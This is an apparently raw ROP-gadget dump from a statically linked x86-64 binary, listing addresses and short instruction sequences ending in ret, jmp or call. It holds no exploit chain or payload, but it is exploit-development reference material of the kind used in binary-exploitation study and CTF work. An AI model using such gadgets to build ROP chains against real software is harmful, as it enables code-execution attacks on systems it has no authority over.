0x0000000000416b28 : add byte ptr [rax - 0x77], cl ; ret 0x8948
0x000000000044fcd3 : add byte ptr [rax - 0x77], cl ; ret 0x8b48
0x0000000000494b8f : add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x000000000045d018 : add byte ptr [rax - 0x77], cl ; ret 0xb2eb
0x0000000000409ac3 : add byte ptr [rax - 0x77], cl ; ret 0xc031
0x0000000000470f27 : add byte ptr [rax - 0x77], cl ; ret 0xc148
0x0000000000415cfd : add byte ptr [rax - 0x77], cl ; ret 0xf748
0x000000000041b308 : add byte ptr [rax - 0x77], cl ; ret 0xffb8
0x000000000044ff12 : add byte ptr [rax - 0x77], cl ; ret 0xffe9
0x000000000044da20 : add byte ptr [rax - 0x77], cl ; sal ebx, 1 ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00000000004887d1 : add byte ptr [rax - 0x77], cl ; sbb byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x00000000004937af : add byte ptr [rax - 0x77], cl ; shr cl, 1 ; ret 0xfffe
0x0000000000482263 : add byte ptr [rax - 0x77], cl ; xchg dword ptr [rax], eax ; add eax, dword ptr [rax] ; add bl, dh ; ret
0x0000000000416a5f : add byte ptr [rax - 0x77], cl ; xchg eax, ecx ; xor byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x0000000000463cf8 : add byte ptr [rax - 0x77], cl ; xor eax, eax ; jmp 0x463cc8
0x00000000004ba5b3 : add byte ptr [rax - 0x77ffff85], bh ; add bh, ah ; jmp qword ptr [rbx]
0x00000000004916a6 : add byte ptr [rax - 0x7ab70000], al ; ret 0x840f
0x000000000047a2ff : add byte ptr [rax - 0x7b], cl ; div byte ptr [rbp + 4] ; xor rax, rax ; ret
0x000000000047855b : add byte ptr [rax - 0x7b], cl ; push qword ptr [rbp + rax - 0xa] ; ret 0x7408
0x0000000000473ecd : add byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x84 ; ret
0x00000000004958ee : add byte ptr [rax - 0x7d], cl ; and al, 0x10 ; or byte ptr [rax - 0x7d], cl ; ret
0x0000000000484e27 : add byte ptr [rax - 0x7d], cl ; call 0xffffffffc2d19a37
0x0000000000484e26 : add byte ptr [rax - 0x7d], cl ; call 0xffffffffc2d19a38
0x000000000042668c : add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x0000000000423ac7 : add byte ptr [rax - 0x7d], cl ; clc ; add cl, byte ptr [rax + 0xf] ; ret 0x8948
0x0000000000423724 : add byte ptr [rax - 0x7d], cl ; clc ; add cl, byte ptr [rax + 0xf] ; ret 0x8d44
0x000000000048650d : add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax + 0xf] ; ret 0x66c3
0x000000000042a22d : add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax + 0xf] ; ret 0x8348
0x00000000004083e9 : add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax - 0x77] ; ret
0x0000000000468623 : add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rcx - 0x77] ; ret
0x00000000004913d1 : add byte ptr [rax - 0x7d], cl ; in al, dx ; sbb byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x000000000041d55f : add byte ptr [rax - 0x7d], cl ; jg 0x41d5a5 ; add byte ptr [rcx + rcx - 0xd], dh ; ret
0x0000000000425b12 : add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x0000000000478516 : add byte ptr [rax - 0x7d], cl ; js 0x478554 ; add byte ptr [rdx + rax - 0xd], dh ; ret
0x000000000040132a : add byte ptr [rax - 0x7d], cl ; ret
0x000000000044d10f : add byte ptr [rax - 0x7d], cl ; ret 0x3a01
0x0000000000452fc7 : add byte ptr [rax - 0x7d], cl ; ret 0x4101
0x0000000000475d27 : add byte ptr [rax - 0x7d], cl ; ret 0x4404
0x0000000000415b4f : add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000045cc74 : add byte ptr [rax - 0x7d], cl ; ret 0x4804
0x000000000048c50f : add byte ptr [rax - 0x7d], cl ; ret 0x4808
0x00000000004847da : add byte ptr [rax - 0x7d], cl ; ret 0x4810
0x0000000000464814 : add byte ptr [rax - 0x7d], cl ; ret 0x481e
0x0000000000430dd9 : add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000425167 : add byte ptr [rax - 0x7d], cl ; ret 0x4c07
0x0000000000494b6f : add byte ptr [rax - 0x7d], cl ; ret 0x8001
0x0000000000475f08 : add byte ptr [rax - 0x7d], cl ; ret 0x8b08
0x000000000042ac30 : add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x0000000000443d93 : add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000430e07 : add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000484a97 : add byte ptr [rax - 0x7d], cl ; ret 0xf01
0x000000000042c80f : add byte ptr [rax - 0x7d], cl ; rol byte ptr [rax + 0x48], 0x83 ; ret 0x4840
0x000000000047a43f : add byte ptr [rax - 0x7d], cl ; rol byte ptr [rax + 0x49], 0x39 ; ret 0x2774
0x0000000000490172 : add byte ptr [rax - 0x7d], cl ; ror byte ptr [rax], 0x83 ; ret 0x3901
0x0000000000426190 : add byte ptr [rax - 0x7f], cl ; in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret
0x0000000000424e61 : add byte ptr [rax - 0x7f], cl ; in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret 0x2d9
0x0000000000415261 : add byte ptr [rax - 0x7f], cl ; in al, dx ; add byte ptr [rax], 0 ; add al, ch ; ret 0x3d5
0x0000000000461774 : add byte ptr [rax - 0x7f], cl ; ret 0x200
0x0000000000439a3b : add byte ptr [rax - 0x7f], cl ; ret 0x80
0x00000000004b51cb : add byte ptr [rax - 0xa], dl ; call qword ptr [rdi]
0x00000000004b8447 : add byte ptr [rax - 0xd], bl ; stc ; call qword ptr [rax]
0x000000000041873a : add byte ptr [rax - 1], bh ; ret
0x00000000004bc087 : add byte ptr [rax - 7], ch ; cld ; jmp rdx
0x00000000004bc06f : add byte ptr [rax - 7], dl ; cld ; jmp qword ptr [rdx]
0x0000000000425728 : add byte ptr [rax], 0 ; add al, ch ; call rax
0x0000000000416464 : add byte ptr [rax], 0 ; add al, ch ; ret
0x0000000000427c65 : add byte ptr [rax], 0 ; add al, ch ; ret 0x2ab
0x0000000000424e65 : add byte ptr [rax], 0 ; add al, ch ; ret 0x2d9
0x0000000000415265 : add byte ptr [rax], 0 ; add al, ch ; ret 0x3d5
0x00000000004165f3 : add byte ptr [rax], 0 ; add al, ch ; ret 3
0x000000000041c4aa : add byte ptr [rax], 0 ; add bl, dh ; ret
0x000000000041b305 : add byte ptr [rax], 0 ; add byte ptr [rax - 0x77], cl ; ret 0xffb8
0x000000000043c21b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x000000000044ec0b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; movzx eax, cl ; pop rbx ; ret
0x000000000041ef43 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret
0x0000000000432a9b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000433001 : add byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004b6d0a : add byte ptr [rax], al ; adc al, 0x89 ; clc ; jmp qword ptr [rsi]
0x00000000004bca0a : add byte ptr [rax], al ; adc byte ptr [rax + 0x4d100000], ah ; std ; call qword ptr [rdx]
0x00000000004b920a : add byte ptr [rax], al ; adc byte ptr [rax], ch ; add byte ptr [rax], dh ; movsb byte ptr [rdi], byte ptr [rsi] ; cli ; call qword ptr [rbx]
0x00000000004bca0e : add byte ptr [rax], al ; adc byte ptr [rbp - 3], cl ; call qword ptr [rdx]
0x00000000004b8f0a : add byte ptr [rax], al ; adc byte ptr [rbp], ah ; add al, dl ; mov dl, bh ; call qword ptr [rcx]
0x00000000004b70fe : add byte ptr [rax], al ; add al, 0x47 ; add byte ptr [rax], al ; in al, dx ; jne 0x4b7109 ; jmp rbx
0x00000000004b78fe : add byte ptr [rax], al ; add al, 0x4f ; add byte ptr [rax], al ; pop rsp ; cdq ; stc ; call rsi
0x00000000004b33da : add byte ptr [rax], al ; add al, 0x86 ; cmc ; call rsp
0x0000000000425729 : add byte ptr [rax], al ; add al, ch ; call rax
0x0000000000416465 : add byte ptr [rax], al ; add al, ch ; ret
0x0000000000427c66 : add byte ptr [rax], al ; add al, ch ; ret 0x2ab
0x0000000000424e66 : add byte ptr [rax], al ; add al, ch ; ret 0x2d9
0x0000000000415266 : add byte ptr [rax], al ; add al, ch ; ret 0x3d5
0x000000000048c936 : add byte ptr [rax], al ; add al, ch ; ret 0xffc7
0x00000000004165f4 : add byte ptr [rax], al ; add al, ch ; ret 3
0x000000000046574e : add byte ptr [rax], al ; add bh, al ; test dword ptr [rax], ecx ; idiv edi ; call qword ptr [rax]
0x00000000004153ed : add byte ptr [rax], al ; add bh, bh ; adc ecx, dword ptr [rax - 0x7d] ; ret
0x000000000048c48d : add byte ptr [rax], al ; add bh, bh ; ror dword ptr [rax - 0x77], cl ; ret
0x000000000047b26f : add byte ptr [rax], al ; add bl, al ; mov eax, 2 ; ret
0x000000000048c757 : add byte ptr [rax], al ; add bl, ch ; ret
0x0000000000415cc6 : add byte ptr [rax], al ; add bl, ch ; ret 0x1f0f
0x000000000041c4ab : add byte ptr [rax], al ; add bl, dh ; ret
0x00000000004b9999 : add byte ptr [rax], al ; add byte ptr [rax + 0x1000006f], ah ; ret
0x00000000004b4161 : add byte ptr [rax], al ; add byte ptr [rax + 0x17], ch ; add byte ptr [rax], al ; cwde ; ret
0x000000000046f748 : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret
0x000000000046ca36 : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret 0x8349
0x000000000040128a : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret 0x8948
0x00000000004814e8 : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret 0x8d48
0x0000000000401452 : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret 0xf74
0x0000000000425cff : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret
0x0000000000491bc1 : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x830f
0x0000000000420b5d : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x840f
0x0000000000419c5d : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x850f
0x0000000000491c56 : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x9272
0x0000000000471e64 : add byte ptr [rax], al ; add byte ptr [rax + 0x63], cl ; ret
0x000000000044b23d : add byte ptr [rax], al ; add byte ptr [rax + 0x78d4837], cl ; ret
0x000000000044ec55 : add byte ptr [rax], al ; add byte ptr [rax + 0xf48f0e5], al ; ret 0xc35b
0x00000000004237d2 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret
0x000000000048bcd2 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x0000000000459c12 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x8948
0x0000000000424881 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x894c
0x000000000044ebc8 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0xc35b
0x000000000047af8d : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x000000000045ac26 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0xff85
0x00000000004011e5 : add byte ptr [rax], al ; add byte ptr [rax + 1], bh ; ret
0x0000000000489bf9 : add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; ret
0x000000000048a2c6 : add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; ret 0x149
0x000000000048b2c3 : add byte ptr [rax], al ; add byte ptr [rax + 2], bh ; ret
0x0000000000450ed1 : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret
0x0000000000416671 : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x00000000004640bd : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xffa0
0x000000000045033d : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xffc0
0x000000000045f4d7 : add byte ptr [rax], al ; add byte ptr [rax - 0x3f], cl ; ret 0x4811
0x000000000045f4ae : add byte ptr [rax], al ; add byte ptr [rax - 0x3f], cl ; ret 0x6411
0x000000000045ee0e : add byte ptr [rax], al ; add byte ptr [rax - 0x3f], cl ; ret 0x8511
0x000000000045df2b : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; add dword ptr [rax + 0x39], r9d ; ret
0x000000000045df49 : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; add r9b, byte ptr [rax + 0x39] ; ret
0x000000000045df67 : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; add r9d, dword ptr [rax + 0x39] ; ret
0x00000000004883d9 : add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; ret 0xeb30
0x00000000004202fd : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; adc byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000415320 : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; js 0x41534e ; call rdx
0x000000000041f15d : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; clc ; ret
0x0000000000478c52 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fucompi st(0) ; ret
0x000000000049206c : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fucompi st(1) ; ret
0x0000000000452c1d : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; jo 0x452c4b ; ret
0x0000000000429fdd : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; out dx, al ; mov rdi, rax ; call rcx
0x0000000000416aa1 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x0000000000417cd4 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x294c
0x0000000000466d44 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8148
0x000000000042235d : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x0000000000494b8d : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x00000000004711c5 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0xc148
0x0000000000415cfb : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0xf748
0x000000000041b306 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0xffb8
0x00000000004937ad : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; shr cl, 1 ; ret 0xfffe
0x00000000004916a4 : add byte ptr [rax], al ; add byte ptr [rax - 0x7ab70000], al ; ret 0x840f
0x0000000000473ecb : add byte ptr [rax], al ; add byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x84 ; ret
0x0000000000401be5 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000044d10d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x3a01
0x0000000000415b4d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000048c50d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4808
0x00000000004847d8 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4810
0x0000000000431af3 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000494b6d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x8001
0x00000000004797be : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x0000000000445451 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000431b1d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000042c80d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; rol byte ptr [rax + 0x48], 0x83 ; ret 0x4840
0x0000000000490170 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ror byte ptr [rax], 0x83 ; ret 0x3901
0x000000000043b234 : add byte ptr [rax], al ; add byte ptr [rax - 0x7f], cl ; ret 0x80
0x0000000000418738 : add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; ret
0x00000000004153eb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bh, bh ; adc ecx, dword ptr [rax - 0x7d] ; ret
0x000000000048c48b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bh, bh ; ror dword ptr [rax - 0x77], cl ; ret
0x000000000041f11b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x0000000000419c5b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x850f
0x00000000004640bb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xffa0
0x000000000045033b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xffc0
0x000000000041f15b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; clc ; ret
0x0000000000452c1b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; jo 0x452c4d ; ret
0x000000000042235b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x0000000000494b8b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x00000000004937ab : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; shr cl, 1 ; ret 0xfffe
0x000000000040c8cb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000044d10b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x3a01
0x0000000000415b4b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000494b6b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x8001
0x00000000004004f8 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004004fa : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004a71b2 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x24
0x00000000004a76a2 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x33
0x000000000041fabb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000044d34b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx + 1], cl ; ret
0x000000000042cb5b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x000000000042b46b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0xf10
0x00000000004196db : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 2 ; ret
0x000000000042085b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0x8348
0x000000000042918b : add byte ptr [rax], al ; add byte ptr [rax], al ; add dh, dh ; ret 0x4804
0x000000000045101b : add byte ptr [rax], al ; add byte ptr [rax], al ; add dh, dh ; ret 0x7404
0x000000000047b48c : add byte ptr [rax], al ; add byte ptr [rax], al ; add rax, 3 ; ret
0x000000000048867f : add byte ptr [rax], al ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x00000000004153ec : add byte ptr [rax], al ; add byte ptr [rax], al ; call qword ptr [rbx]
0x00000000004207cc : add byte ptr [rax], al ; add byte ptr [rax], al ; call rax
0x000000000048c48c : add byte ptr [rax], al ; add byte ptr [rax], al ; call rbx
0x00000000004a91dc : add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x00000000004a838c : add byte ptr [rax], al ; add byte ptr [rax], al ; call rsp
0x000000000044ebc7 : add byte ptr [rax], al ; add byte ptr [rax], al ; cmove rax, rdx ; pop rbx ; ret
0x0000000000493d74 : add byte ptr [rax], al ; add byte ptr [rax], al ; je 0x493d5c ; ret
0x000000000048c756 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x48c724
0x0000000000466b7d : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp rax
0x000000000044b86c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xa] ; ret
0x000000000044b87c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xb] ; ret
0x000000000044b88c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xc] ; ret
0x000000000044b89c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xd] ; ret
0x000000000044b8ac : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xe] ; ret
0x000000000044b7ec : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 1] ; ret
0x000000000044b7fc : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 2] ; ret
0x000000000044b80c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 3] ; ret
0x000000000044b81c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 4] ; ret
0x000000000044b82c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 5] ; ret
0x000000000044b83c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 6] ; ret
0x000000000044b84c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 8] ; ret
0x000000000044b85c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi + 9] ; ret
0x000000000044b7dc : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi] ; ret
0x0000000000400eda : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x000000000044b23c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rdi], dh ; lea rax, qword ptr [rdi] ; ret
0x000000000044ac1c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rdi], dh ; ret
0x000000000041f0dc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x00000000004011e4 : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 1 ; ret
0x000000000048b2c2 : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 2 ; ret
0x000000000043c21c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x0000000000452c1c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rax + 0x20], rsi ; ret
0x000000000048868c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, qword ptr [rax + 8] ; ret
0x000000000041f14c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x68] ; ret
0x000000000041f15c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, rdi ; ret
0x0000000000487b2c : add byte ptr [rax], al ; add byte ptr [rax], al ; movsx eax, dl ; sub eax, ecx ; ret
0x00000000004196dc : add byte ptr [rax], al ; add byte ptr [rax], al ; movzx eax, byte ptr [rdx] ; ret
0x000000000044ec0c : add byte ptr [rax], al ; add byte ptr [rax], al ; movzx eax, cl ; pop rbx ; ret
0x000000000043c36c : add byte ptr [rax], al ; add byte ptr [rax], al ; movzx edx, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x000000000041fabc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041829c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00000000004004fc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00000000004a81ac : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x1d4
0x00000000004a8944 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x1d5
0x00000000004a71b4 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x24
0x00000000004a76a4 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x33
0x0000000000400407 : add byte ptr [rax], al ; add byte ptr [rax], al ; test rax, rax ; je 0x40041b ; call rax
0x000000000043234c : add byte ptr [rax], al ; add byte ptr [rax], al ; vzeroupper ; xor eax, eax ; ret
0x0000000000401dac : add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000047a2ec : add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; vzeroupper ; ret
0x000000000044b61c : add byte ptr [rax], al ; add byte ptr [rax], al ; xor rax, rax ; ret
0x0000000000450054 : add byte ptr [rax], al ; add byte ptr [rbp + 0x10], dh ; add rsp, 0x28 ; ret
0x000000000048bc0d : add byte ptr [rax], al ; add byte ptr [rbp + 0x12], dh ; add rsp, 0x38 ; ret
0x0000000000494c81 : add byte ptr [rax], al ; add byte ptr [rbp + 0x1a], dh ; ret
0x000000000047c50b : add byte ptr [rax], al ; add byte ptr [rbp + 0x1b], dh ; add rsp, 0x38 ; ret
0x0000000000488a12 : add byte ptr [rax], al ; add byte ptr [rbp + 0x27], dh ; add rsp, 0x68 ; ret
0x0000000000488952 : add byte ptr [rax], al ; add byte ptr [rbp + 0x2c], dh ; add rsp, 0x38 ; ret
0x000000000045e555 : add byte ptr [rax], al ; add byte ptr [rbp + 0x31], al ; leave ; call r15
0x0000000000488b73 : add byte ptr [rax], al ; add byte ptr [rbp + 0x36], dh ; add rsp, 0x78 ; ret
0x000000000048ae7e : add byte ptr [rax], al ; add byte ptr [rbp + 0x3b], dh ; leave ; ret
0x000000000045116d : add byte ptr [rax], al ; add byte ptr [rbp + 0x41], bl ; pop rsp ; jmp rax
0x0000000000450284 : add byte ptr [rax], al ; add byte ptr [rbp + 0x42], dh ; add rsp, 0x58 ; ret
0x000000000047c3d9 : add byte ptr [rax], al ; add byte ptr [rbp + 0x45], dh ; add rsp, 0x58 ; ret
0x0000000000450614 : add byte ptr [rax], al ; add byte ptr [rbp + 0x4a], dh ; add rsp, 0x68 ; ret
0x0000000000450f83 : add byte ptr [rax], al ; add byte ptr [rbp + 0xf], dh ; add rsp, 0x28 ; ret
0x000000000048ef68 : add byte ptr [rax], al ; add byte ptr [rbp + 0xf], dh ; add rsp, 0x38 ; ret
0x00000000004618cc : add byte ptr [rax], al ; add byte ptr [rbp + 5], dh ; add rsp, 0x18 ; ret
0x000000000048bb2a : add byte ptr [rax], al ; add byte ptr [rbp + 5], dh ; add rsp, 0x38 ; ret
0x0000000000493db6 : add byte ptr [rax], al ; add byte ptr [rbp + rax + 0x48], dh ; mov dword ptr [rdi + rsi*8], edx ; ret
0x0000000000425a99 : add byte ptr [rax], al ; add byte ptr [rbp + rcx*4 + 0x46], cl ; dec dword ptr [rax - 0x77] ; ret 0x2948
0x0000000000452718 : add byte ptr [rax], al ; add byte ptr [rbp - 0x3dbbf040], al ; ret
0x00000000004b698e : add byte ptr [rax], al ; add byte ptr [rbp - 9], al ; jmp qword ptr [rbx]
0x000000000045e789 : add byte ptr [rax], al ; add byte ptr [rbx + 0x41], bl ; pop rsp ; ret
0x000000000043bafd : add byte ptr [rax], al ; add byte ptr [rbx + 0x5789fc56], cl ; cld ; ret
0x000000000041acb2 : add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x000000000040135b : add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000416619 : add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; ret
0x0000000000493d75 : add byte ptr [rax], al ; add byte ptr [rbx + rbx*8 - 0xd], dh ; ret
0x0000000000473b5d : add byte ptr [rax], al ; add byte ptr [rbx - 0x4f743], al ; jmp qword ptr [rax]
0x000000000046cb6a : add byte ptr [rax], al ; add byte ptr [rbx - 0x77], bl ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x0000000000417fc4 : add byte ptr [rax], al ; add byte ptr [rcx + 0x2b], cl ; and byte ptr [r8 + 1], r9b ; ret
0x000000000046766f : add byte ptr [rax], al ; add byte ptr [rcx + 0x63], cl ; ret 0x8944
0x0000000000473428 : add byte ptr [rax], al ; add byte ptr [rcx + 0x63], cl ; ret 0x8948
0x0000000000470136 : add byte ptr [rax], al ; add byte ptr [rcx + 0xf], al ; mov dh, 0x46 ; or al, 0x83 ; ret
0x00000000004743a9 : add byte ptr [rax], al ; add byte ptr [rcx + 0xf], al ; ret 0x3941
0x000000000044d34d : add byte ptr [rax], al ; add byte ptr [rcx + 1], cl ; ret
